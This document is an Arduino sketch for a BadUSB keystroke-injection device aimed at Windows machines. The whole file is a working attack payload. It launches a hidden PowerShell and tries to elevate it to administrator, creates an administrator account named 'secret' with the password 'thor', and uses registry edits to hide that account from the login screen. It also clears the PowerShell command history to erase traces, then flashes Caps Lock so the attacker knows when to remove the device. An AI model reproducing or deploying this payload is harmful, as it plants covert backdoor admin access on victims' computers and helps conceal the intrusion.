#include <Keyboard.h>

// Utility function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup()
{
  // Start Keyboard and Mouse
  
  Keyboard.begin();

  delay(2000);

  // Minimize all apps

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  delay(200);

  // Start powershell as admin

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("powershell.exe -windowstyle hidden");

  delay(150);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(2000);

  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();

  delay(150);

  typeKey(KEY_RETURN);

  delay(2000);

  // Create a new user

  Keyboard.print("net user secret thor /add");
  
  typeKey(KEY_RETURN);

  // Add this user to the localgroup "Administrators"

  Keyboard.print("net localgroup Administrators secret /add");

  typeKey(KEY_RETURN);

  // Make this user invisible

  Keyboard.print("reg add 'HKEY_LOCAL_MACHINE");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("Software");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("Microsoft");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("Windows");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("Windows NT");

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("CurrentVersion");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("Winlogon");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("SpecialAccounts");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("Userlist' /v secret /t REG_DWORD /d 0 /f");

  typeKey(KEY_RETURN);

  // Set interactive logon on : Don't display last signed-in to allow you to connect to invisible account

  Keyboard.print("Set-Itemproperty -path 'HKLM:");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("SOFTWARE");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("Microsoft");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("Windows");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("CurrentVersion");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("Policies");
  
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(173);
  Keyboard.releaseAll();

  Keyboard.print("System' -Name 'dontdisplaylastusername' -value '1'");

  typeKey(KEY_RETURN);

  // Clear powershell command history

  Keyboard.print("Clear-Content (Get-PSReadlineOption).HistorySavePath");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);
  
  // Make capslock flash to know when you can unplug the BadUSB
  
  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(2000);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  delay(150);

  Keyboard.write(KEY_CAPS_LOCK);

  // End of Payload

  // Stop Keyboard and Mouse
  Keyboard.end();
}

// Unused
void loop() {}
